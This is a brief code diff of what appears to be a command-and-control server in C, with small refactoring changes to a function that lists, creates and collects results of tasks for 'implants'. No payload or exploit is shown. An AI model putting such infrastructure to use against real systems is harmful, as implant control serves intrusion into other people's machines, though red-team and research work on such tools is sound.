@@ -11,6 +11,7 @@
 #include <netinet/in.h>
 
 #include "db.h"
+#include "logs.h"
 
 int autheticate(int sock) {
     char auth[1024];
@@ -85,13 +86,13 @@ char *interact_with_implant(cJSON *rinfo) {
     }
 
     const char *action_value = action->valuestring;
-    const char *implant_id_value = implant_id->valuestring;
+    char *implant_id_value = implant_id->valuestring;
 
     char *data = malloc(MAX_INFO);
     if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");
 
     if (strcmp(action_value, "list-tasks") == 0) {
-        snprintf(data, MAX_INFO, "%s", tasks_per_agent(implant_id_value));
+        snprintf(data, MAX_INFO, "%s", tasks_per_implant(implant_id_value));
     } 
     else if (strcmp(action_value, "response-task") == 0) {
         cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");
@@ -102,6 +103,7 @@ char *interact_with_implant(cJSON *rinfo) {
         char *data_t = cmd_and_response(task->valueint);
         snprintf(data, MAX_INFO, "%s", data_t);
         free(data_t);
+
     } 
     else if (strcmp(action_value, "new-task") == 0) {
         cJSON *command = cJSON_GetObjectItem(rinfo, "command");
